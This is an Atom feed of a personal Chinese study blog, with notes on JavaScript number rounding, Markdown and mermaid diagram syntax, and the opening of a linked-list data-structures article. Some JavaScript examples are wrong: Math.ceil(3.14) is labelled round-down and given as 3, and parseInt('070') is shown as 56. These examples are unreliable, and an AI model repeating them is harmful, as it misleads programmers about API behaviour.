<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-06-22T12:33:25+08:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">Rengui’s Notes</title><subtitle>Life doesn't just happen to you; you receive everything in your life based on what you've given. 生命中的一切都不是巧合，你得到什么，是源于你付出了什么。</subtitle><author><name>Zhao Rengui</name></author><entry><title type="html">JavaScript Functions</title><link href="http://localhost:4000/php/2019/06/19/functions/" rel="alternate" type="text/html" title="JavaScript Functions" /><published>2019-06-19T00:00:00+08:00</published><updated>2019-06-19T00:00:00+08:00</updated><id>http://localhost:4000/php/2019/06/19/functions</id><content type="html" xml:base="http://localhost:4000/php/2019/06/19/functions/">&lt;h2 id=&quot;数字取整问题&quot;&gt;数字取整问题&lt;/h2&gt;
&lt;ol&gt;
  &lt;li&gt;直接取整(不考虑小数点后的部分)
    &lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;c1&quot;&gt;// 方式一: parseInt()&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;3.14&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//3&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-3.14&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-3&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2019hello&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//2019&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//NaN&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0xA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//10(十六进制)&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;070&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//56(八进制)&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;// 方式二: 位运算&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~~&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;3.14&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//3&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;3.14&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//3&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;3.14&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//3&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;// 方式三: &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;计算后取整(四舍五入,向上取整,向下取整)
    &lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;c1&quot;&gt;// 四舍五入&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;3.14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//3&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ceil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;8.54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//9&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;// 向上取整&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ceil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;3.14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//4&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;// 向下取整&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ceil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;3.14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//3&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;</content><author><name>zrg</name></author><category term="PHP" /><summary type="html">数字取整问题 直接取整(不考虑小数点后的部分) // 方式一: parseInt() var n = parseInt(&quot;3.14&quot;); //3 var n = parseInt(&quot;-3.14&quot;); //-3 var n = parseInt(&quot;2019hello&quot;); //2019 var n = parseInt(&quot;&quot;); //NaN var n = parseInt(&quot;0xA&quot;); //10(十六进制) var n = parseInt(&quot;070&quot;); //56(八进制) // 方式二: 位运算 var n = ~~3.14 //3 var n = 3.14^0 //3 var n = 3.14&amp;lt;&amp;lt;0 //3 // 方式三: 计算后取整(四舍五入,向上取整,向下取整) // 四舍五入 var n = Math.round(3.14); //3 var n = Math.ceil(8.54); //9 // 向上取整 var n = Math.ceil(3.14); //4 // 向下取整 var n = Math.ceil(3.14); //3</summary></entry><entry><title type="html">Thinking In Java</title><link href="http://localhost:4000/2019/06/18/thinking-in-java/" rel="alternate" type="text/html" title="Thinking In Java" /><published>2019-06-18T00:00:00+08:00</published><updated>2019-06-18T00:00:00+08:00</updated><id>http://localhost:4000/2019/06/18/thinking-in-java</id><content type="html" xml:base="http://localhost:4000/2019/06/18/thinking-in-java/"></content><author><name>Zhao Rengui</name></author><summary type="html"></summary></entry><entry><title type="html">Learning Markdown</title><link href="http://localhost:4000/software/2019/06/05/markdown/" rel="alternate" type="text/html" title="Learning Markdown" /><published>2019-06-05T00:00:00+08:00</published><updated>2019-06-05T00:00:00+08:00</updated><id>http://localhost:4000/software/2019/06/05/markdown</id><content type="html" xml:base="http://localhost:4000/software/2019/06/05/markdown/">&lt;h2 id=&quot;标题&quot;&gt;标题&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;# 一级标题 
## 二级标题
### 三级标题&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;列表&quot;&gt;列表&lt;/h2&gt;
&lt;ol&gt;
  &lt;li&gt;有序列表&lt;/li&gt;
  &lt;li&gt;有序列表&lt;/li&gt;
  &lt;li&gt;无序列表
    &lt;h2 id=&quot;引用&quot;&gt;引用&lt;/h2&gt;
    &lt;blockquote&gt;
      &lt;p&gt;有的人活着，他已经死了；有的人死了，他还活着&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;图片&quot;&gt;图片&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png&quot; alt=&quot;Google Logo&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;链接&quot;&gt;链接&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://www.google.com/&quot;&gt;Google&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;分割线&quot;&gt;分割线&lt;/h2&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;粗体斜体&quot;&gt;粗体/斜体&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;作者&lt;/strong&gt;
&lt;em&gt;张三&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;代码&quot;&gt;代码&lt;/h2&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#/bin/sh&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hello world&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;区块标识&quot;&gt;区块标识&lt;/h2&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;这是一个区块
……
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;表格&quot;&gt;表格&lt;/h2&gt;
&lt;p&gt;|姓名|性别|毕业学校|工资|
|:—|:—:|:—:|—:|
|张三|男|重庆交通大学|3200|
|李四|男|贵州大学|5000|
|王五|女|北京大学|2000|&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;:— 左对齐
—: 右对齐
— 居中&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;时序图流程图甘特图&quot;&gt;时序图/流程图/甘特图&lt;/h2&gt;
&lt;h3 id=&quot;sequence&quot;&gt;sequence&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-sequence&quot;&gt;title: 时序图例子
A-&amp;gt;B: 实线实箭头 
B--&amp;gt;C: 虚线实箭头 
C-&amp;gt;&amp;gt;C: 实线虚箭头 
note right of C: 自通知 
note over B,C:横跨通知 
C-&amp;gt;A:长通知 
note left of A:左通知
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;flow&quot;&gt;flow&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;start,开始
end,结束
condition,条件判断
inputoutput,输入输出
operation,操作/执行
subroutine,子任务
isLogin(yes)-&amp;gt;main,isLogin(no)-&amp;gt;login,判断流程控制
login(right),位置指定
-&amp;gt;,流程控制操作符
=&amp;gt;,赋值操作符&lt;/p&gt;
  &lt;pre&gt;&lt;code class=&quot;language-flow&quot;&gt;start=&amp;gt;start: 开始
isLogin=&amp;gt;condition: 是否登录
login=&amp;gt;operation: 登录
view=&amp;gt;operation: 浏览
end=&amp;gt;end: 结束
start-&amp;gt;isLogin
isLogin(no)-&amp;gt;login-&amp;gt;view
isLogin(yes)-&amp;gt;view
view-&amp;gt;end
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;mermaid&quot;&gt;mermaid&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;简介
    &lt;blockquote&gt;
      &lt;p&gt;Mermaid 是一个用于画流程图、状态图、时序图、甘特图的库，使用 JS 进行本地渲染，广泛集成于许多 Markdown 编辑器中。
Mermaid 作为一个使用 JS 渲染的库，生成的不是一个“图片”，而是一段 HTML 代码&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;图表方向
|用词|含义|
|:—|:—|
|TB	|从上到下|
|BT	|从下到上|
|RL	|从右到左|
|LR	|从左到右|&lt;/li&gt;
  &lt;li&gt;节点定义
|表述|说明|
|:—|:—|
|id[文字]	|矩形节点|
|id(文字)	|圆角矩形节点|
|id((文字))|	圆形节点|
|id&amp;gt;文字]	|右向旗帜状节点|
|id{文字}	|菱形节点|&lt;/li&gt;
  &lt;li&gt;节点之间的连接线
|表述	|说明|
|:—|:—|
|&amp;gt;	|添加尾部箭头|
|-	|不添加尾部箭头|
|–	|单线|
|–text–	|单线上加文字|
|==	|粗线|
|==text==	|粗线加文字|
|-.-	|虚线|
|-.text.-	|虚线加文字|&lt;/li&gt;
  &lt;li&gt;子图表
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;subgraph 子图表名称
 子图表中的描述语句...
end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;mermaid: 流程图
    &lt;pre&gt;&lt;code class=&quot;language-mermaid&quot;&gt;graph TB
A(开始) --&amp;gt;B[Round edge]
 B --&amp;gt; C{Decision}
 C --&amp;gt;|Y| D[Result one]
C --&amp;gt;|N| E[Result two]
D --&amp;gt;F
E --&amp;gt;F[结束]
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;mermaid: 序列图
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sequenceDiagram
 [参与者1][消息线][参与者2]:消息体
 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;pre&gt;&lt;code class=&quot;language-mermaid&quot;&gt;sequenceDiagram
 张三-&amp;gt;&amp;gt;李四: 吃了吗？
 李四-&amp;gt;&amp;gt;张三: 吃了
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;ul&gt;
  &lt;li&gt;消息线
|类型	|描述|
|:—|:—|
|-&amp;gt;	|无箭头的实线|
|–&amp;gt;	|无箭头的虚线|
|-»	|有箭头的实线|
|–»|	有箭头的虚线|
|-x	|末端为叉的实线（表示异步）|
|–x|	末端为叉的虚线（表示异步）|&lt;/li&gt;
&lt;/ul&gt;</content><author><name>zrg</name></author><category term="Markdown" /><summary type="html">标题 # 一级标题 ## 二级标题 ### 三级标题</summary></entry><entry><title type="html">数据结构与算法</title><link href="http://localhost:4000/algorithms/2019/02/13/data-structure-algorithms/" rel="alternate" type="text/html" title="数据结构与算法" /><published>2019-02-13T00:00:00+08:00</published><updated>2019-02-13T00:00:00+08:00</updated><id>http://localhost:4000/algorithms/2019/02/13/data-structure-algorithms</id><content type="html" xml:base="http://localhost:4000/algorithms/2019/02/13/data-structure-algorithms/">&lt;div id=&quot;outline-container-orgfb1089b&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgfb1089b&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 数据结构和算法目录&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
首先明确一点：程序=数据结构+算法
&lt;/pre&gt;

&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 1:&lt;/span&gt; 数据结构和算法表&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;线性结构&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;树&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;堆&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;图&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;排序算法&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;数组、单链表和双链表&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;二叉查找树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;二叉堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;图的理论基础&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;冒泡排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Linux内核中双向链表的经典实现&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;AVL树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;左倾堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;无向图&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;快速排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;栈&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;伸展树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;斜堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;有向图&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;插入排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;队列&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;红黑树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;二项堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;深度优先搜索和广度优先搜索&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;希尔排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;哈夫曼树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;斐波那契堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;拓扑排序&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;选择排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2026;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2026;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;Kruskal算法&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;堆排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;Prim算法&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;归并排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;Dijkstra算法&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;桶排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2026;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;基数排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2026;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org7f683b0&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org7f683b0&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 线性结构&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
常用的线性结构有：线性表，栈，队列，循环队列，数组。
&lt;/pre&gt;

&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;线性表：是一种线性结构，它是具有相同类型的n(n≥0)个数据元素组成的有限序列。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;顺序表：是在计算机内存中以数组的形式保存的线性表，是指用一组地址连续的存储单元依次存储数据元素的线性结构。&lt;/li&gt;
&lt;li&gt;链表（Linked list）
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;单链表：它由节点组成，每个节点都包含下一个节点的指针。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;单链表分为：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;动态单链表&lt;/li&gt;
&lt;li&gt;静态单链表&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
单链表操作图示
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-01.jpg&quot; alt=&quot;linked-list-01.jpg&quot; /&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
表头为空，表头的后继节点是&quot;节点10&quot;，&quot;节点10&quot;的后继节点是&quot;节点20&quot;。
&lt;/pre&gt;

&lt;p&gt;
&lt;b&gt;删除节点&lt;/b&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-02.jpg&quot; alt=&quot;linked-list-02.jpg&quot; /&gt;
&lt;b&gt;添加节点&lt;/b&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-03.jpg&quot; alt=&quot;linked-list-03.jpg&quot; /&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;单链表的特点是：节点的链接方向是单向的；相对于数组来说，单链表的的随机访问速度较慢，但是单链表删除/添加数据的效率很高。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;双链表：它也是由节点组成，它的每个数据结点中都有两个指针，分别指向直接后继和直接前驱。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
双链表操作图示
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-04.jpg&quot; alt=&quot;linked-list-04.jpg&quot; /&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
表头为空，表头的后继节点为&quot;节点10&quot;(数据为10的节点)；&quot;节点10&quot;的后继节点是&quot;节点20&quot;(数据为10的节点)，&quot;节点20&quot;的前继节点是&quot;节点10&quot;；&quot;节点20&quot;的后继节点是&quot;节点30&quot;，&quot;节点30&quot;的前继节点是&quot;节点20&quot;；...；末尾节点的后继节点是表头。
&lt;/pre&gt;

&lt;p&gt;
&lt;b&gt;删除节点&lt;/b&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-05.jpg&quot; alt=&quot;linked-list-05.jpg&quot; /&gt;
&lt;b&gt;添加节点&lt;/b&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-06.jpg&quot; alt=&quot;linked-list-06.jpg&quot; /&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;代码实现
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
Java
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-java&quot; id=&quot;org3dd71ac&quot;&gt;&lt;span style=&quot;color: #727072;&quot;&gt;/**&lt;/span&gt;
&lt;span style=&quot;color: #727072;&quot;&gt; * Java &amp;#23454;&amp;#29616;&amp;#30340;&amp;#21452;&amp;#21521;&amp;#38142;&amp;#34920;&amp;#12290; &lt;/span&gt;
&lt;span style=&quot;color: #727072;&quot;&gt; * &amp;#27880;&amp;#65306;java&amp;#33258;&amp;#24102;&amp;#30340;&amp;#38598;&amp;#21512;&amp;#21253;&amp;#20013;&amp;#26377;&amp;#23454;&amp;#29616;&amp;#21452;&amp;#21521;&amp;#38142;&amp;#34920;&amp;#65292;&amp;#36335;&amp;#24452;&amp;#26159;:java.util.LinkedList&lt;/span&gt;
&lt;span style=&quot;color: #727072;&quot;&gt; */&lt;/span&gt;
&lt;span style=&quot;color: #ff6188;&quot;&gt;public&lt;/span&gt; &lt;span style=&quot;color: #ff6188;&quot;&gt;class&lt;/span&gt; &lt;span style=&quot;color: #78dce8;&quot;&gt;DoubleLink&lt;/span&gt;&amp;lt;&lt;span style=&quot;color: #78dce8;&quot;&gt;T&lt;/span&gt;&amp;gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;循环链表
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;单循环链表&lt;/li&gt;
